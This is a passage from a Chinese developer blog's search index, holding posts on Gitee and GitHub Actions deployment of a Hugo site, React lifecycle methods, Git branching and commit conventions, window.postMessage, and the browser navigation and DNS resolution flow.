yanglbme/gitee-pages-action@main with: # 注意替换为你的 Gitee 用户名 gitee-username: lianpf # 注意替换为你的 Gitee 用户名 gitee-password: ${{ secrets.GITEE_PASSWORD }} # 注意替换为你的 Gitee 仓库，仓库名严格区分大小写，请准确填写，否则会出错 gitee-repo: lianpf/lianpf # 要部署的分支，默认是 master，若是其他分支，则需要指定（指定的分支必须存在） branch: master 参考 wearerequired/git-mirror-action@master yanglbme/gitee-pages-action Gitee 如何自动部署 Pages | 冴羽 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/gitee-sync-build-blog/","summary":"一、回顾『国外站点gitHub』自动构建发布 GitHub Action + Hugo 自动构建","title":"GitHub Action + Gitee 构建同步国内和国外站点"},{"content":"汇总一下SSR同构方案，这里以REACT为例\u0026hellip;\n一、什么是SSR 1.标题1.1 正文。。。\n二、SSR核心原理 三、双端机制对比 参考 https://juejin.cn/post/6844904127537889287 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/react-ssr/","summary":"\u003cp\u003e汇总一下SSR同构方案，这里以REACT为例\u0026hellip;\u003c/p\u003e","title":"React \u0026 Vue: SSR同构"},{"content":"这是一篇原计划在react v16.x 发布的时候要写的文章，按照这个时间节点，至少拖欠了两年之久\u0026hellip;\n大部分团队不见得会跟进升到16版本，所以16前的生命周期还是很有必要掌握的，何况16也是基于之前的修改。所以我们会针对 v16.0 之前 和 v16.x的维度去介绍\n组件生命周期的三个阶段 Mounting（加载阶段） Some methods are called in the following order when an instance of a component is being created and inserted into the DOM.\nUpdating（更新阶段） An update can be caused by changes to props or state. Some methods are called in the following order when a component is being re-rendered.\nUnmounting（卸载阶段） When a component is being removed from the DOM.\n旧的生命周期(v16.0之前) Mounting（加载阶段：涉及6个钩子函数） constructor() 加载的时候调用一次，可以初始化state getDefaultProps() 设置默认的props，也可以用dufaultProps设置组件的默认属性 getInitialState() 初始化state，可以直接在constructor中定义this.state componentWillMount() 组件加载时只调用，以后组件更新不调用，整个生命周期只调用一次，此时可以修改state render() react最重要的步骤，创建虚拟dom，进行diff算法，更新dom树都在此进行 componentDidMount() 组件渲染之后调用，只调用一次 Updating（更新阶段：涉及5个钩子函数) componentWillReceiveProps(nextProps) 组件加载时不调用，组件接受新的props时调用 shouldComponentUpdate(nextProps, nextState) 组件接收到新的props或者state时调用，return true就会更新dom（使用diff算法更新），return false能阻止更新（不调用render） componentWillUpdata(nextProps, nextState) 组件加载时不调用，只有在组件将要更新时才调用，此时可以修改state render() react最重要的步骤，创建虚拟dom，进行diff算法，更新dom树都在此进行 componentDidUpdate() 组件加载时不调用，组件更新完成后调用 Unmounting（卸载阶段：涉及1个钩子函数） componentWillUnmount()\n组件即将卸载前调用，只调用一次\n基础写法 import React, { Component } from \u0026#39;react\u0026#39; export default class ReactComponent15 extends Component { constructor(props) { super(props) // getDefaultProps：接收初始props // getInitialState：初始化state } state = { } componentWillMount() { // 组件挂载前触发 } render() { return ( \u0026lt;h2\u0026gt;Old React.Component\u0026lt;/h2\u0026gt; ) } componentDidMount() { // 组件挂载后触发 } componentWillReceiveProps(nextProps) { // 接收到新的props时触发 } shouldComponentUpdate(nextProps, nextState) { // 组件Props或者state改变时触发，true：更新，false：不更新 return true } componentWillUpdate(nextProps, nextState) { // 组件更新前触发 } componentDidUpdate() { // 组件更新后触发 } componentWillUnmount() { // 组件卸载时触发 } } 新的生命周期(v16.x) static getDerivedStateFromProps(props, state) getSnapshotBeforeUpdate(prevProps, prevState) static getDerivedStateFromProps(props, state) 组件每次被re-render的时候，包括在组件构建之后(虚拟dom之后，实际dom挂载之前)，每次获取新的props或state之后；每次接收新的props之后都会返回一个对象作为新的state，返回null则说明不需要更新state；配合componentDidUpdate，可以覆盖componentWillReceiveProps的所有用法\ngetSnapshotBeforeUpdate(prevProps, prevState) 触发时间: update发生的时候，在render之后，在组件dom渲染之前；返回一个值，作为componentDidUpdate的第三个参数；配合componentDidUpdate, 可以覆盖componentWillUpdate的所有用法\nMounting（加载阶段：涉及4个钩子函数） constructor() 加载的时候调用一次，可以初始化state static getDerivedStateFromProps(props, state) 新的生命周期 render() react最重要的步骤，创建虚拟dom，进行diff算法，更新dom树都在此进行 componentDidMount() 组件渲染之后调用，只调用一次 Note:\nThese methods are considered legacy and you should avoid them in new code: UNSAFE_componentWillMount()\nUpdating（更新阶段：涉及5个钩子函数) static getDerivedStateFromProps(props, state) 新的生命周期 shouldComponentUpdate(nextProps, nextState) 组件接收到新的props或者state时调用，return true就会更新dom（使用diff算法更新），return false能阻止更新（不调用render） render() react最重要的步骤，创建虚拟dom，进行diff算法，更新dom树都在此进行 getSnapshotBeforeUpdate(prevProps, prevState) 新的生命周期 componentDidUpdate() 组件加载时不调用，组件更新完成后调用 Note: These methods are considered legacy and you should avoid them in new code:\nUNSAFE_componentWillUpdate() UNSAFE_componentWillReceiveProps() Unmounting（卸载阶段：涉及1个钩子函数） componentWillUnmount()\n组件即将卸载前调用，只调用一次\nError Handling(错误处理) static getDerivedStateFromError() componentDidCatch(error，info) These methods are called when there is an error during rendering, in a lifecycle method, or in the constructor of any child component\n基本用法 import React, { Component } from \u0026#39;react\u0026#39; export default class ReactComponent16 extends Component { constructor(props) { super(props) // getDefaultProps：接收初始props // getInitialState：初始化state } state = { } static getDerivedStateFromProps(props, state) { // 组件每次被rerender的时候，包括在组件构建之后(虚拟dom之后，实际dom挂载之前)，每次获取新的props或state之后；;每次接收新的props之后都会返回一个对象作为新的state，返回null则说明不需要更新state return state } componentDidCatch(error, info) { // 获取到javascript错误 } render() { return ( \u0026lt;h2\u0026gt;New React.Component\u0026lt;/h2\u0026gt; ) } componentDidMount() { // 挂载后 } shouldComponentUpdate(nextProps, nextState) { // 组件Props或者state改变时触发，true：更新，false：不更新 return true } getSnapshotBeforeUpdate(prevProps, prevState) { // 组件更新前触发 } componentDidUpdate() { // 组件更新后触发 } componentWillUnmount() { // 组件卸载时触发 } } 总结 旧的生命周期 新的生命周期 React16新的生命周期弃用了componentWillMount、componentWillReceiveProps，componentWillUpdate 新增了getDerivedStateFromProps、getSnapshotBeforeUpdate来代替弃用的三个钩子函数（componentWillMount、componentWillReceiveProps，componentWillUpdate） React16并没有删除这三个钩子函数，但是不能和新增的钩子函数（getDerivedStateFromProps、getSnapshotBeforeUpdate）混用，React17将会删除componentWillMount、componentWillReceiveProps，componentWillUpdate 新增了对错误的处理（componentDidCatch）\n参考 react-component 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/react-lifecycle/","summary":"\u003cp\u003e这是一篇原计划在react v16.x 发布的时候要写的文章，按照这个时间节点，至少拖欠了两年之久\u0026hellip;\u003c/p\u003e","title":"聊下react中生命周期"},{"content":"一、背景 团队开发中，遵循一个合理、清晰的 Git 使用流程，是非常重要的。 否则，各种不清晰的分支，再加上一堆杂乱无章的commit，在后续的查找定位问题和产品迭代维护会让你知道什么是头疼的。\n如果项目中只有两三个人开发，其实也不需要严格的规范，只要把提交内容写清楚就行，但是大型项目，开发人员较多，规范提交还是有必要的\n所以，我们会从以下几个方面来讲:\n分支命名规范 分支使用规范(git-flow) commit 规范 二、分支命名规范 (1) master 分支\nmaster 为主分支，用于部署生产环境，要确保稳定性 master 分支一般由 develop 以及 hotfix 分支合并，任何时间都不能直接修改 master 分支代码 每次更新master，都需对master添加指定格式的tag(git tag -a v0.0.1 -m \u0026ldquo;填写描述\u0026rdquo;)，用于发布或回滚 (2) develop 分支\ndevelop 为开发分支，始终保持最新完成以及bug修复后的代码 一般开发新功能时，feature 分支都是基于 develop 分支下创建的 (3) feature 分支\n开发新功能时，以 develop 分支为基础创建 feature 分支 分支命名: feature/ 开头的为特性分支， 命名规则: feature/module_userName_date 例子： feature/lowCodeConfigs_yaoLing_20201015\n(4) release 分支\nrelease 为预发布分支，发布提测阶段，以 release 分支代码为基准提测 (5) hotfix 分支\n分支命名: hotfix/ 开头的为修复分支，它的命名规则与 feature 分支类似 线上出现紧急问题时，需要及时修复，以 master 分支为基线，创建 hotfix 分支，修复完成后，需要合并到 master 分支和 develop 分支 三、分支使用规范(git-flow) 新功能开发流程\n从 develop 分支创建 feature 分支 开发调试完将 feature 分支提交到远程版本库 提交 pull request 请求 Merge 到 develop 分支 相关负责人 code review 同意合并后，删除远程 feature 分支 不同意，重新修改后上传 feature 分支，回到第3步执行 依赖develop分支构建测试环境，质量工程师功能测试验收 测试问题直接在develop分支修复 测试环境验收通过，且合并develop分支至release分支，release分支填入最近\u0026quot;日常发布日\u0026quot;发布计划，发布预发环境，邀请产品和视觉团队验收 预发问题在测试分支修复，修复完成后返回第5步 预发环境验收通过，发布日自动构建部署，正常发布。邀请产品团队生产验收，确认无误则合并release分支到master分支和develop分支 紧急问题修复流程\n从 master 分支创建 hotfix 分支且申请填写“紧急发布计划” 修复完将 hotfix 分支提交到远程版本库 提交 pull request 请求 Merge 到 release 分支 相关负责人 code review 同意合并后，删除远程 hotfix 分支 不同意，重新修改后上传 hotfix 分支，回到第3步执行 依赖 release 分支构预发环境，质量工程师功能测试验收 问题直接在 release 分支修复 预发环境验收通过，启动紧急发布计划自动构建部署，正常发布。邀请产品团队生产验收，确认无误则合并release分支到master分支和develop分支 注意：实际项目中，由于需求的复杂性，可能同时存在多个测试分支、预发分支\n四、commit 规范 下面代码的 -m 参数，就是用来指定 commit message 的\n$ git commit -m \u0026#34;commit message\u0026#34; 一般来说，commit message 应该清晰明了，说明本次提交的目的。而且多人协作的时候，有问题也方便查看提交日志。\n如果一行不够，可以只执行git commit，就会跳出文本编辑器，让你写多行\n目前，社区有多种 Commit message 的写法规范。来自Angular 规范是目前使用最广的写法，比较合理和系统化\n参考 angular/angular.js commits 记录。\nCommit message 包括三个部分：Header、Body 和 Footer\n\u0026lt;type\u0026gt;(\u0026lt;scope\u0026gt;): \u0026lt;subject\u0026gt; // 空一行 \u0026lt;body\u0026gt; // 空一行 \u0026lt;footer\u0026gt; 其中，Header 是必需的，Body 和 Footer 可以省略。为了避免自动换行影响美观，每部分，任何一行都不要有太多字符\n1、Head\nHeader部分只有一行，包括三个字段：type（必填）、scope（影响范围，选填）和subject（必填）\ntype，必选\ncommit 的类别，只允许使用以下标识（或用对应的 emoji 表情，在前边再加一个: 就会显示了）\nfeat：新增功能（✨） fix：修补bug（ 🚑） docs：修改文档（📚） style： 格式化代码结构，无逻辑上的代码修改（🎨) refactor：重构，即不是新增功能，也不是修改bug的代码变动，比如重命名变量（🚜） test：增加测试代码，单元测试一类的，没有生产代码的变更（🔬） chore：构建过程或辅助工具的变动（不会影响代码运行） revert：回滚到上一个版本。 merge：代码合并。 sync：同步主线或分支的Bug 特殊情况，当前 commit 用于撤销以前的 commit，则必须以revert:开头，后面跟着被撤销 Commit 的 Header\nrevert: feat: 设计器 Configs 基础配置 This reverts commit 660ecc1654a317a13331b17617d973392f418f02 推荐一个编写 Commit message 的工具 Commitizen\nscope: 可选。用于定义 type 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同\nsubject: 必选。commit目的的简短描述，不超过50个字符\n2、Body\nBody 部分是对本次 commit 的详细描述，可以分成多行，每行尽量不超过72个字符\n3、Footer\nFooter 部分只用于两种情况:\n不兼容变动: 如果当前代码与上一个版本不兼容，则 Footer 部分以BREAKING CHANGE开头，后面是对变动的描述、以及变动理由和迁移方法 关闭 Issue：如果当前 commit 针对某个issue，那么可以在 Footer 部分关闭这个 issue Closes #234 Closes #123, #245, #992 示例\nfeat: 设计器 Configs 基础配置 fix: 修复Container Page特殊属性联动切换问题 style: delete 冗余联调阶段debugger docs: 更新api文档 chore: 升级 monaco-editor 及对应babel 插件包版本 refactor: 重构Configs 方案（预设-\u0026gt;动态拓展） 参考 如何规范你的Git commit.阿里技术 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n","permalink":"https://lianpf.github.io/posts/other/git-teamusage-standards/","summary":"一、背景 团队开发中，遵循一个合理、清晰的 Git 使用流程，是非常重","title":"Git: 团队分支命名使用和Commit提交规范"},{"content":"一、整个流程及原理 1.物料 xxx.github.io public 仓库 A 存放个人源码(博客文稿) 的 private 仓库 B 熟悉 Hugo 熟悉 github actions 注意：国内站点可以参考Gitee\n2.流程及原理 本地添加文章，提交到 Github 仓库 B push 操作自动触发 Github 仓库 B 预先配置的Actions 执行对应的action，构建打包，且发布打包后的源码到仓库 A 托管 通过 Github 给 Pages 生成的 URL 访问即可 二、详细步骤 1.创建仓库且配置SSH Key 创建 xxx.github.io 仓库 创建存放源码仓库 Blogs（根据个人需求可设置为private） 生成一对SSH Key，为两个仓库绑定 SSH Key 为什么需要SSH Key？\n当我们在通过Git提交源码之后，Github Actions会编译生成静态文件并通过Git Push到 xxx.github.io，因此这一步需要 Git 账户认证。\n如何配置？\n生成的 Public Key 添加到 xxx.github.io 仓库，settings -\u0026gt; Deploy keys，变量名无所谓。 Private Key 添加到 源码仓库 Blogs，settings -\u0026gt; Secrets。这里 Secrets 变量名要一定是： ACTIONS_DEPLOY_KEY, 会在源码仓库hugo action .yml文件自动化构建部署用到。 2.启用 Hugo 2.1 将 xxx.github.io.source 仓库克隆到本地，初始化 Hugo 系统 # 选取一个目录 # 克隆 source 仓库 git clone xxx # 进入仓库 cd xxx.github.io 生成 Hugo 源码并进行配置\n# 在当前目录生成 Hugo 源码 hugo new site . # 为当前博客选取一个主题，你可以不执行这一命令使用默认的主题 git submodule add https://github.com/halogenica/beautifulhugo.git themes/beautifulhugo # 编辑 config.toml 配置文件，使 beautifulhugo 主题生效 echo \u0026#39;theme = \u0026#34;beautifulhugo\u0026#34;\u0026#39; \u0026gt;\u0026gt; config.tomlecho \u0026#39;theme = \u0026#34;beautifulhugo\u0026#34;\u0026#39; \u0026gt;\u0026gt; config.tom # 此时你就可以运行预览效果 hugo serve -D 此时，控制台构建成功,输出可访问地址：\nhttp://localhost:1313/ 满意没问题之后，即可推送到 Github\ngit add . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master 3.配置 Github 自动构建发布 Actions 源码仓库Blogs为 xxx.github.io 仓库配置action。可直接拷贝如下代码：\nname: GitHubPages on: push: branches: - master # Set a branch to deploy jobs: deploy: runs-on: ubuntu-20.04 # ubuntu-18.04 已废弃，注意因ubuntu版本问题导致deploy启动失败 steps: - uses: actions/checkout@v2 with: submodules: recursive # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: # hugo-version: \u0026#39;${{ steps.hugo-version.outputs.HUGO_VERSION }}\u0026#39; hugo-version: \u0026#39;0.74.2\u0026#39; # extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.ACTIONS_DEPLOY_KEY }} external_repository: xxx/xxx.github.io publish_branch: master publish_dir: ./public 修改远程仓库即可，其他的基本上不用更新。\n4.验证 本地修改源码, commit、push，检查流水线是被正常触发，可以查看流水线日志确认。\n整个搭建就结束了，我们可以访问Github为 xxx/xxx.github.io 仓库生成的域名：https://xxx.github.io/ 查看效果\n三、功能拓展 issue评论插件utterances: 使用、生成配置 hugo语法纪要 四、遇到的坑 brew 安装 hugo，一直 update Supported Tokens 三种方案 SSH Key 和 deploy_key 的问题 Github Pages访问较慢 1.brew install hugo，一直 update 国内的网络环境下使用 Homebrew 安装软件的过程中可能会长时间卡在 Updating Homebrew 这个步骤 例：执行 brew install composer 命令\n➜ ~ brew install composer Updating Homebrew... # 如果碰到长时间卡在这里，参考以下 2 种处理方法 1.1 方法 1：按住 control + c 取消本次更新操作 ➜ ~ brew install composer Updating Homebrew... ^C 按住 control + c 之后命令行会显示 ^C，就代表已经取消了 Updating Homebrew 操作\n大概不到 1 秒钟之后就会去执行我们真正需要的安装操作了\n➜ ~ brew install composer Updating Homebrew... ^C==\u0026gt; Satisfying dependencies ==\u0026gt; Downloading https://getcomposer.org/download/1.7.2/composer.phar ... 这个方法是临时的、一次性的\n1.2 方法 2：使用 Alibaba 的 Homebrew 镜像源进行加速 执行 brew 命令安装软件的时候，跟以下 3 个仓库地址有关\nbrew.git homebrew-core.git homebrew-bottles 所以， 将这 3 个仓库地址全部替换为 Alibaba 提供的地址\n# 替换成阿里巴巴的 brew.git 仓库地址: cd \u0026#34;$(brew --repo)\u0026#34; git remote set-url origin https://mirrors.aliyun.com/homebrew/brew.git # 替换成阿里巴巴的 homebrew-core.git 仓库地址: cd \u0026#34;$(brew --repo)/Library/Taps/homebrew/homebrew-core\u0026#34; git remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git # 替换 / 还原 homebrew-bottles 访问地址, 这个步骤跟你的 macOS 系统使用的 shell 版本有关系 # 如果你的输出结果是 /bin/zsh，参考下方的 zsh 终端操作方式 # 如果你的输出结果是 /bin/bash，参考下方的 bash 终端操作方式 echo $SHELL # zsh 终端操作方式，替换成阿里巴巴的 homebrew-bottles 访问地址: echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.zshrc source ~/.zshrc # bash 终端操作方式，替换 homebrew-bottles 访问 URL: echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile source ~/.bash_profile # ======================================================= # 还原为官方提供的 brew.git 仓库地址 cd \u0026#34;$(brew --repo)\u0026#34; git remote set-url origin https://github.com/Homebrew/brew.git # 还原为官方提供的 homebrew-core.git 仓库地址 cd \u0026#34;$(brew --repo)/Library/Taps/homebrew/homebrew-core\u0026#34; git remote set-url origin https://github.com/Homebrew/homebrew-core.git # zsh 终端操作方式，还原为官方提供的 homebrew-bottles 访问地址 vi ~/.zshrc # 然后，删除 HOMEBREW_BOTTLE_DOMAIN 这一行配置 source ~/.zshrc # bash 终端操作方式，还原为官方提供的 homebrew-bottles 访问地址 vi ~/.bash_profile # 然后，删除 HOMEBREW_BOTTLE_DOMAIN 这一行配置 source ~/.bash_profile 2.Github Actions 实现的三种方案 github_token deploy_key personal_token 简单来说，github_token 更适合 源码和 public/ 存放在同一个仓库下，源码放在 master 分支，public/ 内容放在另一个分支（如 gh-pages），并指定部署 gh-pages 分支的内容。deploy_key 则更适合，源码存储于一个单独的仓库，而 public/ 存放在主仓库 xxx.github.io 的模式。\n详细使用和差异，建议参考 官方文档\n3.SSH Key 和 deploy_key 的问题 问题：常规本地已经存在公共的 ssk key, 这个key 我们常用于 gitHub 或 gitLab 整个 depository 下的公共设置，用于 ssh仓库 pull / push 代码。但是，我们这里也需要一对 具体仓库下（即 源码仓库blogs 和 xxx.github.io）的deploy_key。官方完档里没有提及这点，最开始，我是直接把已有的push key放到xxx.github.io仓库内，很明显。会爆出 key 已被用的错误提示。所以，后边我们重新生成一对key, 用于 deploy_key\nssh-keygen -t rsa -C \u0026#34;xxx@foxmail.com\u0026#34; -f ~/.ssh/id_rsa_hugo_deploy 4. Github Pages访问较慢 可通过自定义域名+CDN加快访问速度\n5. GitHub Actions远程构建: 提示Node不兼容包的 warning 具体错误如下：\nThe following actions uses node12 which is deprecated and will be forced to run on node16: actions/checkout@v2. For more info\u0026hellip; Node.js 16 actions are deprecated. Please update the following actions to use Node.js 20: actions/checkout@v2, peaceiris/actions-hugo@v2, peaceiris/actions-gh-pages@v3. For more information\u0026hellip; 解决方案（升级.yml文件中的以下包）： actions/checkout@v2 -\u0026gt; actions/checkout@v3 更多详细内容参考 工具: 常用的GitHub Actions - Blogs\n相关内容 博主站点仓库地址：https://github.com/lianpf/lianpf.github.io 如果觉得这篇文章有助于你，麻烦gitHub点个star，给本文点赞。\n如若遇到问题，可到该仓库下提issue。\n参考文章 hugo主题 \u0026ldquo;hugo-theme-dream\u0026rdquo; actions-gh-pages hugo中文网 hugo-theme-dream文档 hugo官网 hexo官网 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n","permalink":"https://lianpf.github.io/posts/other/github-actions-and-hugo-auto-build-blog/","summary":"一、整个流程及原理 1.物料 xxx.github.io public 仓库 A 存放个人源码(博客文稿)","title":"GitHub Action + Hugo 自动构建发布个人博客"},{"content":"window.postMessage\u0026hellip;\n一、window.postMessage 基础语法 1.为什么使用 对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数Document.domain设置为相同的值) 时，这两个脚本才能相互通信。\nwindow.postMessage()则实现了不同页面脚本的跨域通信\n2.语法 2-1 发送 otherWindow.postMessage(message, targetOrigin, [transfer]); otherWindow, 其他窗口的一个引用 iframe的contentWindow属性 执行window.open返回的窗口对象 命名过或数值索引的window.frames message: 要发送到其他 window的数据 targetOrigin: 指定哪些窗口能接收到消息事件, 其值可以是字符串\u0026quot;*\u0026quot;（表示无限制）或者一个URI 2-2 监听接收 window.addEventListener(\u0026#34;message\u0026#34;, receiveMessage, false); function receiveMessage(event) { // 安全：始终使用origin和source属性验证发件人的身份 // 这里不准确，chrome没有这个属性 // var origin = event.origin || event.originalEvent.origin; var origin = event.origin if (origin !== \u0026#34;http://example.org:8080\u0026#34;) return; // ... } message 的属性有:\ndata: 从其他 window 中传递过来的对象 origin: 调用 postMessage 时消息发送方窗口的 origin source: 对发送消息的窗口对象的引用; 使用此属性可实现不同origin的两个窗口双向通信 二、多场景通信 多标签页通信 iframe嵌套通信 1.多标签页通信 /* * A窗口的域名是\u0026lt;http://example.com:8080\u0026gt;，以下是A窗口的script标签下的代码： */ var popup = window.open(...popup details...); popup.postMessage(\u0026#34;hello there!\u0026#34;, \u0026#34;http://example.org\u0026#34;); function receiveMessage(event) { // 我们能相信信息的发送者吗? (也许这个发送者和我们最初打开的不是同一个页面). if (event.origin !== \u0026#34;http://example.org\u0026#34;) return; // event.source 是我们通过window.open打开的弹出页面 popup // event.data 是 popup发送给当前页面的消息 \u0026#34;hi there yourself! the secret response is: rheeeeet!\u0026#34; } window.addEventListener(\u0026#34;message\u0026#34;, receiveMessage, false); /* * 弹出页 popup 域名是\u0026lt;http://example.org\u0026gt;，以下是script标签中的代码: */ //当A页面postMessage被调用后，这个function被addEventListener调用 function receiveMessage(event) { // 验证了所受到信息的origin if (event.origin !== \u0026#34;http://example.com:8080\u0026#34;) return; // event.source 就当前弹出页的来源页面 // event.data 是 \u0026#34;hello there!\u0026#34; // 把event.source作为回信的对象，并且把event.origin作为targetOrigin event.source.postMessage(\u0026#34;hi there yourself! the secret response \u0026#34; + \u0026#34;is: rheeeeet!\u0026#34;, event.origin); } window.addEventListener(\u0026#34;message\u0026#34;, receiveMessage, false); 2.iframe嵌套通信 主应用\n\u0026lt;iframe src=\u0026#39;https://lianpf.github.io\u0026#39; ref=\u0026#39;iframe\u0026#39; id=\u0026#39;iframe\u0026gt;\u0026lt;/iframe\u0026gt; mounted() { this.$refs.iframe.contentWindow.postMessage({type:\u0026#39;initData\u0026#39;, data: this.date}, this.$refs.iframe.src) window.addEventListener( \u0026#39;message\u0026#39;, e =\u0026gt; { // ... }, false ) } iframe: 地址https://lianpf.github.io\nwindow.parent.postMessage({ type: \u0026#39;release\u0026#39;, data: { schema: this.$refs.editor.preview, staticCode: this.$refs.editor.tempCustomJSCode, staticCodeUMD: compileCode } }) mounted/create () { window.addEventListener( \u0026#39;message\u0026#39;, e =\u0026gt; { if(typeof e.data === \u0026#39;string\u0026#39;){ console.log(\u0026#39;传递无效信息\u0026#39;) } else { if(e.data.type) { console.log(\u0026#39;正常发送数据\u0026#39;) const receiveData = e.data if (receiveData.type) { // TODO: 数据分发更新store handleReceiveData(receiveData, vue) } } } }, false ) } 参考 window.postMessage - Web API 接口 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/11.use-post_message/","summary":"\u003cp\u003e\u003ccode\u003ewindow.postMessage\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"JavaScript: PostMessage使用"},{"content":"浏览器输入URL到⻚面展示完整流程主要涉及到：浏览器进程、网络进程和渲染进程。其中\u0026hellip;\n一、概述 导航流程负责从输入URL到浏览器进程提交文档给渲染进程。渲染流程则负责HTML、CSS和JavaScript绘制成页面\n图：从输入URL到⻚面展示完整流程示意图\n如上所示：\n浏览器进程：主要负责用戶交互、子进程管理和文件储存等功能 网络进程：发起HTTP请求流程为渲染进程和浏览器进程等提供网络下载功能 渲染进程：把从网络下载的HTML、JavaScript、CSS、图片等资源，通过渲染流程解析为可显示和交互的⻚面 渲染进程所有的内容都是通过网络获取的，会存在一些恶意代码利用浏览器漏洞对系统进行攻击，所以运行在渲染进程里面的代码是不被信任的。Chrome会让渲染进程运行在安全沙箱里保证系统的安全。Gitee-cloud-notes: 计算机网络安全\n其中，导航流程涉及到浏览器进程和网络进程，渲染流程涉及到渲染进程\n二、详述导航流程\u0026amp;渲染流程 整个流程如下：\n用户输入地址 URL请求流程 查缓存 HTTP请求流程: Blog: HTTP请求流程 DNS解析 TCP连接和TLS连接 浏览器端发起HTTP请求和服务器端处理HTTP请求 断开TCP连接(长连接待tab页关闭，自动断开TCP连接) 准备渲染进程 提交文档 渲染阶段: HTML Parse、Recalculate Style、Layout、Update Layer Tree、Paint、Composite Layers、显示 1、用户输入地址 浏览器进程判断输入的关键字是搜索内容，还是请求的URL\n搜索内容：将其组装进默认搜索引擎的URL中进行搜索 正则符合URL规则：构建 URL 请求并通过 IPC 通信将请求交给网络进程。从历史记录、书签等，找到已经输入的字符串可能对应的 url，给出智能提示，让你可以补全url地址 比如输入的是 time.geekbang.org，那么地址栏会根据规则，把这段内容加上协议，合成为完整的URL，如 https://time.geekbang.org\n当浏览器刚开始加载一个地址 time.geekbang.org后，标签⻚上的图标便进入加载状态。但此时当前⻚面并没立即替换为极客时间的⻚面，显示的仍然是之前打开的⻚面内容。因为需要等待提交文档阶段，⻚面内容才会被替换\n2、URL请求流程 浏览器进程通过进程间通信(IPC)把URL请求发送至网络进程，网络进程接收到URL请求发起真正的URL请求流程。\n查缓存：网络进程查找本地缓存是否缓存了该资源，有则直接返回资源给浏览器进程。无则进入网络请求(HTTP请求)流程 网络请求(HTTP请求)流程 DNS解析：获取请求域名的服务器IP地址和端口 TCP连接和TLS连接 请求协议是HTTPS，还需要建立TLS连接 利用IP地址和服务器建立TCP连接，该过程可能会等待 TCP 队列 发起构建请求：浏览器端构建请求行、请求头等信息，并把和该域名相关的Cookie等数据附加到请求头中，向服务器发送构建的请求信息 服务器处理请求且响应：会根据请求信息生成响应数据(包括响应行、响应头和响应体等信息)，并发给网络进程 网络进程解析响应头：网络进程接收了响应行和响应头后，开始解析响应头的内容了。(为了方便讲述，下面将服务器返回的响应头和响应行统称为响应头) 根据状态码做不同反应，400、500通知浏览器进程报错，301、302进入重定向，304缓存，200则正常 如果正常或者缓存，则进一步查看 Content-type，针对不同的content-type，做不同的处理。ex：application/octet-stream 交给下载管理器处理，text/html 就通知浏览器进程准备渲染进程 2.1 DNS解析 DNS解析过程是寻找浏览器\u0026quot;所需资源\u0026quot;对应机器的过程。当在浏览器中输入地址http://www.baidu.com，但这不是百度网站真正意义上的地址。互联网上每一台计算机的唯一标识是它的IP地址，但IP地址不便记忆。所以互联网设计者在用户的方便性与可用性方面做一个权衡，做了一个网址到IP地址的转换，这个过程就是DNS解析。而这个所谓的网址也就是域名\nDNS服务器分为3个级别: 根级别DNS、顶级DNS、负责提供二级域名的DNS服务器IP地址\n域名有三个部分,以zhuanlan.zhihu.com为例: com 是顶级域名, zhihu是二级域名, zhuanlan是三级域名(通常被称为子域名)\n根级别DNS： 负责提供各类顶级域名(如:com、cn、gov、deu等)对应的DNS服务器ip地址 顶级DNS：负责提供二级域名的DNS服务器IP地址。每一个顶级域名都有对应的DNS的服务器,通常由专门的机构公司来维护。 比如com由Verisign Global Registry Services公司维护,edu由Educause公司维护. 它们各自提供自家域名下的子域名（二级域名)的名称服务。 通常所说的\u0026quot;购买域名\u0026quot;就是向这些公司的数据库注册一条记录 权威DNS：负责提供三级域名对应的主机IP地址。由域名购买者搭建的，在购买域名时就要向注册机构提供,然后被录入到顶级DNS的数据库。现在的云主机服务商,都提供了托管权威DNS服务. 图: DNS查询解析过程\n浏览器中输入www.qq.com域名，DNS查询解析过程：\n(1) 查找浏览器缓存：浏览器一般会缓存DNS记录一段时间，不同浏览器的时间可能不一样，一般2-30分钟不等，浏览器去查找这些缓存，如果有缓存，直接返回IP，否则下一步 (2) 本地的hosts文件：操作系统检查本地的hosts文件是否有这个网址映射关系，有则调用这个IP地址映射，完成域名解析 (3) DNS缓存：hosts里无此网址映射关系，则查找本地DNS解析器缓存，有则直接返回，完成域名解析 DNS 缓存(DNS 